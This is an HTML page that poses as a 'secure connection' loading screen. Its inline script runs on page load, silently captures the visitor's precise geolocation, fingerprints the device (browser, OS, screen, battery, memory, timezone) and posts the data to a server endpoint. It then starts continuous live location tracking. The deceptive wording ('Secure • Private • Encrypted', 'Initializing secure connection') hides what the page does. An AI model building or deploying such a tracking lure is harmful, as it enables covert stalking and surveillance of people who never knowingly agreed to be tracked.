<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        .loader {
            width: 70px;
            height: 70px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 15px;
        }

        p {
            font-size: 16px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 10px;
        }

        .status {
            display: inline-block;
            padding: 8px 20px;
            background: #667eea;
            color: white;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 20px;
        }

        .success {
            background: #10b981;
        }

        .error {
            background: #ef4444;
        }

        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e5e5e5;
            font-size: 13px;
            color: #999;
        }

        .footer strong {
            color: #667eea;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader" id="loader"></div>
        <h1 id="title">Please Wait...</h1>
        <p id="message">Initializing secure connection</p>
        <span class="status" id="status">Connecting</span>
        
        <div class="footer">
            <p>Built with ❤️ by <strong>Sandeep Gaddam</strong></p>
            <p style="font-size: 11px; margin-top: 8px; color: #ccc;">Secure • Private • Encrypted</p>
        </div>
    </div>

    <script>
        // Generate unique session ID
        let sessionId = localStorage.getItem('unqtraker_session_id');
        if (!sessionId) {
            sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('unqtraker_session_id', sessionId);
        }
        
        const firstSeen = localStorage.getItem('unqtraker_first_seen') || new Date().toISOString();
        localStorage.setItem('unqtraker_first_seen', firstSeen);

        let watchId = null;
        let locationCaptured = false;
        let liveTrackingActive = false;

        // Update UI
        function updateUI(title, message, statusText, statusClass = '') {
            document.getElementById('title').textContent = title;
            document.getElementById('message').textContent = message;
            const statusEl = document.getElementById('status');
            statusEl.textContent = statusText;
            statusEl.className = 'status ' + statusClass;
        }

        // Comprehensive device detection
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown', browserVersion = '', os = 'Unknown', osVersion = '';
            let deviceType = 'Desktop', deviceVendor = '', deviceModel = '';

            // Browser detection
            if (ua.indexOf('Firefox') > -1) {
                browser = 'Firefox';
                browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || '';
            } else if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
                browser = 'Chrome';
                browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || '';
            } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
                browser = 'Safari';
                browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || '';
            } else if (ua.indexOf('Edg') > -1) {
                browser = 'Edge';
                browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || '';
            }

            // OS detection
            if (ua.indexOf('Windows NT 10.0') > -1) {
                os = 'Windows'; osVersion = '10/11';
            } else if (ua.indexOf('Mac OS X') > -1) {
                os = 'macOS';
                osVersion = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1].replace('_', '.') || '';
            } else if (ua.indexOf('Android') > -1) {
                os = 'Android';
                osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || '';
                deviceType = 'Mobile';
            } else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
                os = 'iOS';
                osVersion = ua.match(/OS (\d+_\d+)/)?.[1].replace('_', '.') || '';
                deviceType = ua.indexOf('iPad') > -1 ? 'Tablet' : 'Mobile';
                deviceVendor = 'Apple';
                deviceModel = ua.indexOf('iPad') > -1 ? 'iPad' : 'iPhone';
            } else if (ua.indexOf('Linux') > -1) {
                os = 'Linux';
            }

            if (ua.indexOf('Mobile') > -1 && deviceType === 'Desktop') {
                deviceType = 'Mobile';
            }

            return { browser, browserVersion, os, osVersion, deviceType, deviceVendor, deviceModel };
        }

        // Get connection info
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return connection ? {
                type: connection.effectiveType || connection.type || 'Unknown'
            } : { type: 'Unknown' };
        }

        // Get battery info
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                }
            } catch (e) {}
            return { level: null, charging: null };
        }

        // Send location to server
        async function sendLocation(position, isLive = false) {
            const batteryInfo = await getBatteryInfo();
            const connectionInfo = getConnectionInfo();
            const deviceInfo = getDeviceInfo();

            const locationData = {
                // Location data
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                
                // Browser & OS
                browser: deviceInfo.browser,
                browser_version: deviceInfo.browserVersion,
                os: deviceInfo.os,
                os_version: deviceInfo.osVersion,
                platform: navigator.platform,
                
                // Device info
                device_type: deviceInfo.deviceType,
                device_vendor: deviceInfo.deviceVendor,
                device_model: deviceInfo.deviceModel,
                
                // Screen info
                screen_width: screen.width,
                screen_height: screen.height,
                screen_resolution: `${screen.width}x${screen.height}`,
                color_depth: screen.colorDepth,
                pixel_ratio: window.devicePixelRatio,
                
                // Language & Timezone
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                
                // Additional info
                cookie_enabled: navigator.cookieEnabled,
                online_status: navigator.onLine,
                connection_type: connectionInfo.type,
                touch_support: 'ontouchstart' in window,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                
                // Battery info
                battery_level: batteryInfo.level,
                battery_charging: batteryInfo.charging,
                
                // Session
                session_id: sessionId,
                first_seen: firstSeen,
                is_live: isLive
            };

            try {
                const response = await fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(locationData)
                });

                const result = await response.json();
                return response.ok;
            } catch (error) {
                console.error('Failed to send location:', error);
                return false;
            }
        }

        // Start live tracking
        function startLiveTracking() {
            if (liveTrackingActive) return;
            
            liveTrackingActive = true;
            updateUI('Live Tracking Active', 'Your location is being shared in real-time', 'Connected', 'success');
            
            // Watch position continuously
            watchId = navigator.geolocation.watchPosition(
                async (position) => {
                    await sendLocation(position, true);
                },
                (error) => {
                    console.error('Live tracking error:', error);
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 27000
                }
            );
        }

        // Silent location capture
        async function captureLocation() {
            if (!navigator.geolocation) {
                updateUI('Error', 'Geolocation not supported by your browser', 'Failed', 'error');
                return;
            }

            updateUI('Please Wait...', 'Establishing secure connection', 'Connecting', '');

            // Try to get location without explicit permission prompt (uses cached permission)
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // First location captured
                    const success = await sendLocation(position, false);
                    
                    if (success) {
                        locationCaptured = true;
                        updateUI('Connection Established', 'Secure session active', 'Active', 'success');
                        
                        // Start continuous live tracking
                        setTimeout(() => {
                            startLiveTracking();
                        }, 2000);
                    } else {
                        updateUI('Connection Failed', 'Unable to establish secure session', 'Error', 'error');
                    }
                },
                (error) => {
                    // Handle permission denial or errors
                    if (error.code === error.PERMISSION_DENIED) {
                        updateUI('Permission Required', 'Please allow location access to continue', 'Waiting', 'error');
                    } else if (error.code === error.POSITION_UNAVAILABLE) {
                        updateUI('Location Unavailable', 'Unable to determine your location', 'Error', 'error');
                    } else {
                        updateUI('Timeout', 'Location request timed out', 'Error', 'error');
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        // Auto-start on page load
        window.addEventListener('load', () => {
            // Small delay for better UX
            setTimeout(captureLocation, 1000);
        });

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (watchId) {
                navigator.geolocation.clearWatch(watchId);
            }
        });
    </script>
</body>
</html>